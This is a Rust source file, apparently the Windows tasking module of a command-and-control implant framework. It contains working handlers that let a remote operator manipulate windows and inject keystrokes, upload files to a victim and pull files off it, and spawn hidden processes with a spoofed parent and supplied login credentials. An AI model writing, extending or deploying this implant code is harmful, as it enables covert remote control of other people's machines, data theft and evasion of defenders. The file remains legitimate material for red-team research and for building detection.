// Copyright (C) 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

#![no_implicit_prelude]

use core::ops::Deref;
use core::slice::from_raw_parts;
use core::time::Duration;

use crate::c2::event::{Context, Entry, Poll, Reason, Return, Task};
use crate::c2::mux::Mux;
use crate::c2::task::OsFd;
use crate::c2::{CoreError, CoreResult};
use crate::com::Packet;
use crate::data::{Reader, Writer};
use crate::device::expand_fiber;
use crate::device::winapi::{self, close_window, enable_window, set_window_transparency, show_window, AsHandle, Handle, OwnedHandle, Window};
use crate::fs::{metadata, AsyncFile, File, OpenOptions};
use crate::ignore_error;
use crate::io::{self, Error, ErrorKind};
use crate::prelude::*;

const BLOCK_SIZE: usize = 4096usize;

pub struct Driver {
    h:    Handles,
    sig:  OwnedHandle,
    size: usize,
}
pub struct Fd(Handle);
pub struct Beacon(Handle);

struct Upload {
    buf:  Packet,
    file: AsyncFile,
}
#[repr(C)]
struct Handles {
    signal: Handle,
    events: [Handle; 63],
}

impl Fd {
    #[inline]
    pub fn is_valid(&self) -> bool {
        !self.0.is_invalid()
    }
}
impl Driver {
    #[inline]
    pub fn new() -> io::Result<Driver> {
        let mut d = Driver {
            h:    Handles {
                signal: Handle::INVALID,
                events: [Handle::INVALID; 63],
            },
            sig:  winapi::CreateEvent(None, false, false, true, None)?,
            size: 0usize,
        };
        d.h.signal = d.sig.as_handle();
        Ok(d)
    }

    #[inline]
    pub fn reset(&self) {
        ignore_error!(winapi::ResetEvent(&self.sig));
    }
    #[inline]
    pub fn beacon(&self) -> Beacon {
        Beacon(self.sig.as_handle())
    }
    pub fn update(&mut self, e: &[Entry]) {
        let n = e.len();
        for (i, v) in self.h.events.iter_mut().enumerate() {
            if i < n {
                *v = **(e[i].as_fd());
            } else {
                *v = Handle::INVALID;
            }
        }
        self.size = n + 1;
    }
    #[inline]
    pub fn poll(&mut self, dur: Option<Duration>) -> Option<usize> {
        winapi::wait_for_multiple_objects(
            unsafe { from_raw_parts(&mut self.h as *mut Handles as *mut usize, self.size) },
            self.size,
            false,
            dur.map(|v| v.as_micros() as i32).unwrap_or(-1),
            true,
        )
        .map(|v| v as usize)
        .ok()
        .and_then(|v| if v > 64 { None } else { Some(v) })
        // Remove APC/Timeout status codes.
    }
}
impl Beacon {
    #[inline]
    pub fn set(&self) {
        ignore_error!(winapi::SetEvent(&self.0));
    }
}

impl Deref for Fd {
    type Target = Handle;

    #[inline]
    fn deref(&self) -> &Handle {
        &self.0
    }
}
impl Default for Fd {
    #[inline]
    fn default() -> Fd {
        Fd(Handle::INVALID)
    }
}
impl From<usize> for Fd {
    #[inline]
    fn from(v: usize) -> Fd {
        Fd(Handle(v))
    }
}
impl From<Handle> for Fd {
    #[inline]
    fn from(v: Handle) -> Fd {
        Fd(v)
    }
}

impl OsFd for File {
    #[inline]
    fn get_fd(&self) -> Option<Fd> {
        Some(self.as_handle().into())
    }
}
impl OsFd for AsyncFile {
    #[inline]
    fn get_fd(&self) -> Option<Fd> {
        Some(self.as_handle().into())
    }
}

#[inline]
pub fn task_window_list() -> io::Result<Vec<Window>> {
    winapi::top_level_windows().map_err(Error::from)
}
pub fn task_ui(sched: &mut Mux, mut r: Packet) -> io::Result<()> {
    let (t, h) = (r.read_u8()?, r.read_u64()? as usize);
    match t {
        // 0x0 - taskWindowEnable
        0x0 => enable_window(h, true)?,
        // 0x1 - taskWindowDisable
        0x1 => enable_window(h, false)?,
        // 0x2 - taskWindowTransparency
        0x2 => set_window_transparency(h, r.read_u8()?)?,
        // 0x3 - taskWindowShow
        0x3 => show_window(h, r.read_u8()?.into())?,
        // 0x4 - taskWindowClose
        0x4 => close_window(h)?,
        // 0x5 - taskWindowMessage
        0x5 => {
            // Send this to the Async threads as it might block.
            let f = r.read_u32()?;
            let (t, d) = (
                r.read_str()?.unwrap_or_default(),
                r.read_str()?.unwrap_or_default(),
            );
            sched.submit(
                None,
                Task::new(r.job, move |_ctx, w| {
                    ignore_error!(w.write_u32(winapi::MessageBox(h, d, t, f)?));
                    Ok(Return::Output)
                }),
            );
        },
        // 0x6 - taskWindowMove
        0x6 => winapi::SetWindowPos(
            h,
            r.read_i32()?,
            r.read_i32()?,
            r.read_i32()?,
            r.read_i32()?,
        )?,
        // 0x7 - taskWindowFocus
        0x7 => winapi::SetForegroundWindow(h)?,
        // 0x8 - taskWindowType
        0x8 => {
            if let Some(m) = r.read_str_ptr()? {
                winapi::SendInput(h, m)?;
            }
        },
        _ => return Err(ErrorKind::InvalidInput.into()),
    }
    Ok(())
}
pub fn task_upload(mux: &mut Mux, mut r: Packet) -> CoreResult<Option<Packet>> {
    let p = expand_fiber(r.read_str_ptr()?.ok_or_else(|| CoreError::from(ErrorKind::InvalidInput))?);
    let f = OpenOptions::new().create(true).truncate(true).write(true).open_async(&p)?;
    let mut n = Packet::new();
    ignore_error!(n.write_str(&p));
    let h = f.get_fd();
    let t = Task::new_with_packet(r.job, n, task_upload_done)
        .poll(task_upload_poll)
        .arg(Upload { file: f, buf: r });
    mux.submit(h, t);
    Ok(None)
}
pub fn task_download(mux: &mut Mux, mut r: Packet) -> CoreResult<Option<Packet>> {
    let p = expand_fiber(r.read_str_ptr()?.ok_or_else(|| CoreError::from(ErrorKind::InvalidInput))?);
    let m = metadata(&p)?;
    let mut n = Packet::new();
    ignore_error!(n.write_str(&p));
    if m.is_dir() {
        ignore_error!(n.write_bool(true));
        ignore_error!(n.write_u64(0));
        return Ok(Some(n));
    }
    let s = m.len();
    ignore_error!(n.write_bool(false));
    ignore_error!(n.write_u64(s));
    let f = OpenOptions::new().read(true).open_async(&p)?;
    let (h, l) = (f.get_fd(), n.len());
    n.reserve(s as usize);
    let t = Task::new_with_packet(r.job, n, move |ctx, w| task_download_done(l, ctx, w))
        .poll(task_download_poll)
        .arg(f);
    mux.submit(h, t);
    Ok(None)
}

fn task_upload_done(ctx: &mut Context, w: &mut Packet) -> io::Result<Return> {
    let mut f = some_or_return!(ctx.arg::<Upload>(), Ok(Return::Output));
    f.file.finish(BLOCK_SIZE)?;
    ignore_error!(w.write_u64(f.file.total()));
    Ok(Return::Output)
}
fn task_upload_poll(ctx: &mut Context, r: Reason, _w: &mut Packet) -> io::Result<Poll> {
    match r {
        Reason::Closing | Reason::Timeout => return Ok(Poll::Done),
        _ => (),
    }
    let f = some_or_return!(ctx.arg_mut::<Upload>(), Ok(Poll::Done));
    if !f.file.write_async(BLOCK_SIZE, f.buf.as_slice())? {
        Ok(Poll::Pending)
    } else {
        Ok(Poll::Done)
    }
}
fn task_download_poll(ctx: &mut Context, r: Reason, w: &mut Packet) -> io::Result<Poll> {
    match r {
        Reason::Closing | Reason::Timeout => return Ok(Poll::Done),
        _ => (),
    }
    let f = some_or_return!(ctx.arg_mut::<AsyncFile>(), Ok(Poll::Done));
    if !f.read_async(BLOCK_SIZE, w.as_mut_vec())? {
        Ok(Poll::Pending)
    } else {
        Ok(Poll::Done)
    }
}
fn task_download_done(n: usize, ctx: &mut Context, w: &mut Packet) -> io::Result<Return> {
    let mut f = some_or_return!(ctx.arg::<AsyncFile>(), Ok(Return::Output));
    f.finish(0)?;
    w.truncate(f.total() as usize + n);
    Ok(Return::Output)
}

#[cfg(all(target_family = "windows", feature = "std"))]
mod inner {
    use std::os::windows::io::AsRawHandle;

    use crate::c2::task::{Fd, OsCommand, OsFd, OsMetadata};
    use crate::fs::{File, Metadata};
    use crate::prelude::*;
    use crate::process::{Child, Command};

    impl OsFd for Child {
        #[inline]
        fn get_fd(&self) -> Option<Fd> {
            Some((self.as_raw_handle() as usize).into())
        }
    }
    impl OsCommand for Command {}
    impl OsMetadata for Metadata {
        #[inline]
        fn get_mode(&self) -> u32 {
            let mut m = if self.is_symlink() { 0x8000000u32 } else { 0u32 };
            if self.is_dir() {
                m |= 0x80000000;
            }
            m
        }
    }
}
#[cfg(all(target_family = "windows", not(feature = "std")))]
mod inner {
    use core::mem;

    use crate::c2::task::{Fd, OsCommand, OsFd, OsMetadata, Process};
    use crate::device::winapi::AsHandle;
    use crate::fs::{Metadata, MetadataExtra};
    use crate::prelude::*;
    use crate::process::{Child, Command, CommandExtra};

    impl OsFd for Child {
        #[inline]
        fn get_fd(&self) -> Option<Fd> {
            Some(self.as_handle().into())
        }
    }
    impl OsCommand for Command {
        #[inline]
        fn add_extra(&mut self, p: &mut Process) {
            self.set_flags(p.flags);
            self.set_parent(mem::take(&mut p.filter));
            if p.hide {
                self.set_no_window(true);
                self.set_window_display(0);
            }
            if p.user.len() > 0 {
                self.set_login(
                    Some(mem::take(&mut p.user)),
                    if p.domain.is_empty() {
                        None
                    } else {
                        Some(mem::take(&mut p.domain))
                    },
                    if p.password.is_empty() {
                        None
                    } else {
                        Some(mem::take(&mut p.password))
                    },
                );
            }
        }
    }
    impl OsMetadata for Metadata {
        #[inline]
        fn get_mode(&self) -> u32 {
            self.mode()
        }
    }
}
